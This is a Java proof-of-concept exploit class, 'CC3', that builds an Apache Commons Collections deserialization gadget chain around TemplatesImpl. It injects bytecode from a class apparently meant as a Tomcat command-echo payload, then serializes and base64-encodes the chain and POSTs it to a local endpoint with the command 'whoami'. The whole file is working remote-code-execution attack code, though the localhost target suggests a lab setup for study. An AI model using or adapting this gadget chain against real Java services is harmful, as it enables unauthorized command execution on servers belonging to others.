import cn.hutool.http.HttpRequest;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.MapTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(TomcatEchov.class.getName()).toBytecode()
        });
        setFieldValue(templates, "_name", "EvilTemplatesImpl");
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        Map hashmap = new HashMap();
        hashmap.put("keykey", TrAXFilter.class);
        Transformer maptransformer = MapTransformer.getInstance(hashmap);
        Transformer[] fakeTransformer = new Transformer[] {};
        Transformer[] transformers = new Transformer[]{
                maptransformer,
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformer);
        Map innerMap = new HashMap();
        Map outerMap = DefaultedMap.decorate(innerMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tiedMapEntry, "valuevalue");
        outerMap.remove("keykey");
        setFieldValue(chainedTransformer, "iTransformers", transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

//        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(barr.toByteArray())));
//        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
//        ois.readObject();
//        ois.close();

        // Test
        String poc = Base64.getEncoder().encodeToString(barr.toByteArray());
        String url = "http://127.0.0.1:8079/index?x=whoami";
        HttpRequest httpRequest = HttpRequest.post(url).form("poc", poc);
        String res = httpRequest.execute().body();
        System.out.println(res);
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}